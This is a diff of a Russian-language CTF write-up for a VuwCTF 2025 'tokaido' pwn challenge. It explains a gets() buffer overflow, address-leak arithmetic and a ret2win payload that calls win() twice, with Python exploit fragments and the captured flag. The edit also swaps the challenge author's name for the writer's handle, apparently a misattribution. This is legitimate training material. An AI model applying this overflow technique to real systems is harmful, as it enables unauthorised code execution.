@@ -3,12 +3,12 @@
 > **CTF:** VuwCTF 2025  
 > **Category:** Pwn  
 > **Difficulty:** 100 points  
-> **Author:** maxster  
+> **Author:** pr1ncipLe  
 > **Status:** ✅ Solved
 
 ---
 
-## 📋 Table of Contents
+## Table of Contents
 
 1. [Challenge Information](#challenge-information)
 2. [Initial Reconnaissance](#initial-reconnaissance)
@@ -23,7 +23,7 @@
 
 ---
 
-## 🎯 Challenge Information
+## Challenge Information
 
 | Parameter | Value |
 |-----------|-------|
@@ -35,7 +35,7 @@
 
 ---
 
-## 🔍 Initial Reconnaissance
+## Initial Reconnaissance
 
 При подключении к сервису мы видим простое взаимодействие:
 
@@ -48,7 +48,7 @@ funny number: 0x56fd2a6432ce
 
 ---
 
-## 📝 Source Code Analysis
+## Source Code Analysis
 
 Исходный код `tokaido.c`:
 
@@ -87,16 +87,16 @@ int main() {
 }
 ```
 
-### 🔑 Key Points
+### Key Points
 
-- 📦 **Buffer size:** 16 bytes
-- ⚠️ **Vulnerability:** `gets()` - нет проверки границ!
-- 🎁 **Info leak:** Адрес функции `main()`
-- 🏆 **Win condition:** Функция `win()` должна быть вызвана **дважды**
+- **Buffer size:** 16 bytes
+- **Vulnerability:** `gets()` - нет проверки границ!
+- **Info leak:** Адрес функции `main()`
+- **Win condition:** Функция `win()` должна быть вызвана **дважды**
 
 ---
 
-## 🐛 Vulnerability Analysis
+## Vulnerability Analysis
 
 ### Уязвимость: Buffer Overflow
 
@@ -114,7 +114,7 @@ int main() {
 
 **Для перезаписи return address нужно:** 16 + 8 = **24 байта padding**
 
-### 🎯 Win Condition - Хитрость!
+### Win Condition
 
 Функция `win()` выдает флаг только при **втором** вызове:
 
@@ -125,9 +125,9 @@ int main() {
 
 ---
 
-## 🎮 Exploitation Strategy
+## Exploitation Strategy
 
-### Step 1: 🔬 Локальный анализ бинарника
+### Step 1: Локальный анализ бинарника
 
 Компилируем локальную копию с теми же флагами:
 
@@ -144,21 +144,21 @@ $ objdump -t tokaido | grep -E "main|win"
 0000000000401237 g     F .text  0000000000000095              main
 ```
 
-### 📐 Вычисляем смещение:
+### Вычисляем смещение:
 
 ```
 offset = win - main
 offset = 0x401196 - 0x401237 = -0xA1
 ```
 
-### Step 2: 🧩 Структура payload
+### Step 2: Структура payload
 
 ```python
 payload = [16 bytes padding] + [8 bytes RBP] + [win_addr] + [win_addr]
           └─ заполняем buffer ─┘ └─ saved RBP ─┘ └─ 1st call ─┘ └─ 2nd call ─┘
 ```
 
-### Step 3: 🎯 Динамический расчет адресов
+### Step 3: Динамический расчет адресов
 
 1. Парсим адрес `main()` из вывода сервера
 2. Вычисляем `win_addr = main_addr + offset`
@@ -166,7 +166,7 @@ payload = [16 bytes padding] + [8 bytes RBP] + [win_addr] + [win_addr]
 
 ---
 
-## 💣 The Exploit
+## The Exploit
 
 ```python
 import socket
@@ -229,7 +229,7 @@ def main():
         flag_match = re.search(r'[Vv]uwCTF\{[^}]+\}', decoded_response)
         if flag_match:
             flag = flag_match.group(0)
-            print(f"\n🎉 SUCCESS! FLAG FOUND: {flag}")
+            print(f"\nSUCCESS! FLAG FOUND: {flag}")
         else:
             print("\n[!] FLAG NOT FOUND IN RESPONSE")
             print("[*] Check payload construction and address calculation")
@@ -240,7 +240,7 @@ if __name__ == "__main__":
 
 ---
 
-## 🚀 Execution & Results
+## Execution & Results
 
 ```bash
 $ python3 exploit.py
@@ -259,10 +259,10 @@ you win
 VuwCTF{eastern_sea_route}
 ============================================================
 
-🎉 SUCCESS! FLAG FOUND: VuwCTF{eastern_sea_route}
+SUCCESS! FLAG FOUND: VuwCTF{eastern_sea_route}
 ```
 
-### 📊 Что произошло?
+### Что произошло?
 
 1. ✅ Получили адрес `main()`
 2. ✅ Вычислили адрес `win()`
@@ -272,7 +272,7 @@ VuwCTF{eastern_sea_route}
 
 ---
 
-## 🧠 Technical Deep Dive
+## Technical Deep Dive
 
 ### 1. Buffer Overflow Mechanics
 
@@ -280,7 +280,7 @@ VuwCTF{eastern_sea_route}
 
 ```c
 char buffer[16];
-gets(buffer);  // ⚠️ Нет проверки размера!
+gets(buffer);  // Нет проверки размера!
 ```
 
 Она читает до символа новой строки (`\n`) без ограничений, позволяя перезаписать:
@@ -323,9 +323,9 @@ struct.pack('<Q', 0x401196)
 
 ---
 
-## 📚 Lessons Learned
+## Lessons Learned
 
-### ✨ Технические выводы
+### Технические выводы
 
 1. **Анализируй всю логику программы**  
    Требование вызвать `win()` дважды не было очевидным с первого взгляда
@@ -339,14 +339,7 @@ struct.pack('<Q', 0x401196)
 4. **Структура стека имеет значение**  
    8-байтовый saved RBP после локальных переменных - важно для выравнивания
 
-### 🛡️ Защитные механизмы (отключены в челлендже)
-
-- **Stack Canaries** - случайное значение между buffer и return address
-- **NX bit** - запрет выполнения кода на стеке
-- **PIE** - рандомизация адресов кода
-- **ASLR** - рандомизация адресов библиотек
-
-### 🎓 Практические навыки
+### Практические навыки
 
 - ✅ Buffer overflow эксплуатация
 - ✅ Анализ дизассемблированного кода
@@ -356,7 +349,7 @@ struct.pack('<Q', 0x401196)
 
 ---
 
-## 🏆 Flag
+## Flag
 
 ```
 VuwCTF{eastern_sea_route}
@@ -366,7 +359,7 @@ VuwCTF{eastern_sea_route}
 
 ---
 
-## 🔗 References
+## References
 
 - [OWASP: Buffer Overflow](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow)
 - [LiveOverflow: Binary Exploitation](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
@@ -374,8 +367,8 @@ VuwCTF{eastern_sea_route}
 
 ---
 
-**Writeup by:** [Your Name]  
+**Writeup by: pr1ncipLe
 **Date:** December 2025  
 **CTF:** VuwCTF 2025
 
-*Happy Hacking! 🚩*
+*Happy Hacking!*
